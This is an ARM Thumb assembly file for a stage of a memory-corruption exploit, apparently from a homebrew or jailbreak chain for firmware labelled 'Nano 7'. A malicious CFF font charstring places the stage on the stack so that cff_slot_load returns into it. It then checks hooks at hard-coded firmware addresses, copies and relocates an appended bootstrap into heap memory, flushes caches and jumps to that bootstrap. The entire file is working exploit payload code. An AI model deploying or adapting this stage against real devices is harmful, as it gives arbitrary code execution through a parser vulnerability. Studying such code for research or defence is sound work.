.syntax unified
.thumb

/*
 * Position-independent Nano 7 / 39A10023 CFF stack stage.
 *
 * The exploit decoder writes this image into buildchar, which is inside the
 * active cff_slot_load stack frame.  It patches the three words at the end:
 * the charstring stream address, the offset of the appended HRL1 bootstrap,
 * and the saved firmware return PC.  cff_slot_load then returns here.
 *
 * No fixed writable RAM is used.  This stage writes only to its own stack and
 * to the block returned by the OS heap allocator.  On repeat glyph loads it
 * sees that a hook is already armed and returns without allocating again.
 */
.section .text,"ax",%progbits
.balign 4
.global cff_heap_stage
.type cff_heap_stage,%function
.thumb_func
cff_heap_stage:
    /* cff_slot_load returns with an 8-byte aligned SP.  Save an even number of
     * words so every firmware call below still satisfies AAPCS. */
    push {r4-r8, lr}

    /* Keep the common return stub at the low end of the reclaimed frame.  The
     * allocator grows the live stack down towards this image, so an allocation
     * failure must not branch to a stub placed at the vulnerable high end. */
    b    .Lstart
.Lreturn:
    mov  r12, r8
    pop  {r4-r8, lr}
    bx   r12

.Lstart:

    /* Load the three words patched by the charstring. */
    adr  r3, cff_stage_stream
    ldmia r3, {r4-r6}             /* stream, payload offset, continuation */
    adds r4, r4, r5               /* r4 = packed HRL1 image */
    mov  r8, r6                   /* survive firmware calls */

    /* A prior bootstrap/resident (or a third-party hook) owns the slots. */
    movw r0, #0xbb6c
    movt r0, #0x087c
    ldr  r1, [r0]
    movw r2, #0xe8dd
    movt r2, #0x082a
    cmp  r1, r2
    bne  .Lreturn
    subs r0, #8                   /* raw-message slot = 0x087cbb64 */
    ldr  r1, [r0]
    movw r2, #0x4505
    movt r2, #0x081c
    cmp  r1, r2
    bne  .Lreturn

    /* Validate the trusted build artifact enough to bound every copy. */
    ldr  r0, [r4, #0]             /* 'HRL1' */
    movw r1, #0x5248
    movt r1, #0x314c
    cmp  r0, r1
    bne  .Lreturn
    ldr  r0, [r4, #20]            /* this stage supports 16-byte alignment */
    cmp  r0, #16
    bne  .Lreturn
    ldr  r5, [r4, #8]             /* PROGBITS image size */
    ldr  r6, [r4, #12]            /* full span including BSS */
    cmp  r5, #4
    blo  .Lreturn
    cmp  r6, r5
    blo  .Lreturn
    movw r0, #0x8000              /* hard ceiling: bootstrap is tiny */
    cmp  r6, r0
    bhi  .Lreturn
    ldr  r0, [r4, #4]             /* entry must lie in copied image */
    cmp  r0, r5
    bhs  .Lreturn
    ldr  r0, [r4, #16]            /* reloc table also stays bounded */
    movw r1, #0x0800
    cmp  r0, r1
    bhi  .Lreturn

    /* nothrow heap allocator: tmalloc(span + 15, HEAP_MEM_OBJECT=2) */
    adds r0, r6, #15
    movs r1, #2
    movw r3, #0xb441
    movt r3, #0x0842
    blx  r3
    cmp  r0, #0
    beq  .Lreturn
    adds r0, #15
    bic  r0, r0, #15
    mov  r7, r0                   /* r7 = aligned image base */

    /* Copy image bytes, then zero inter-section gaps and BSS. */
    adds r1, r4, #24
    movs r2, #0
.Lcopy:
    cmp  r2, r5
    bhs  .Lzero
    ldrb r0, [r1, r2]
    strb r0, [r7, r2]
    adds r2, #1
    b    .Lcopy
.Lzero:
    cmp  r2, r6
    bhs  .Lreloc_setup
    movs r0, #0
    strb r0, [r7, r2]
    adds r2, #1
    b    .Lzero

    /* Each relocation word names an ABS32 image location to add base to. */
.Lreloc_setup:
    adds r1, r1, r5
    ldr  r2, [r4, #16]
.Lreloc:
    cbz  r2, .Lflush
    ldr  r0, [r1], #4
    subs r6, r5, #4
    cmp  r0, r6
    bhi  .Lreturn                 /* malformed artifact: do not execute it */
    ldr  r6, [r7, r0]
    adds r6, r6, r7
    str  r6, [r7, r0]
    subs r2, #1
    b    .Lreloc

.Lflush:
    mov  r0, r7
    ldr  r1, [r4, #12]
    movs r2, #7
    mov  r12, r2
    svc  #70
    ldr  r0, [r4, #4]
    adds r0, r0, r7
    orr  r0, r0, #1
    /* Tail-transfer into the heap.  bootstrap_entry restores this stage's
     * saved registers and branches to r8 after its C body returns.  No code in
     * this reclaimed stack image is needed after the heap bootstrap runs. */
    bx   r0
.size cff_heap_stage, .-cff_heap_stage

/* Unique sentinels located and patched by BootstrapPayload. */
.balign 4
.global cff_stage_stream
cff_stage_stream:
    .word 0x5354524d                 /* 'MRTS' */
.global cff_stage_payload_offset
cff_stage_payload_offset:
    .word 0x5041594f                 /* 'OYAP' */
.global cff_stage_continuation
cff_stage_continuation:
    .word 0x5245544e                 /* 'NTER' */
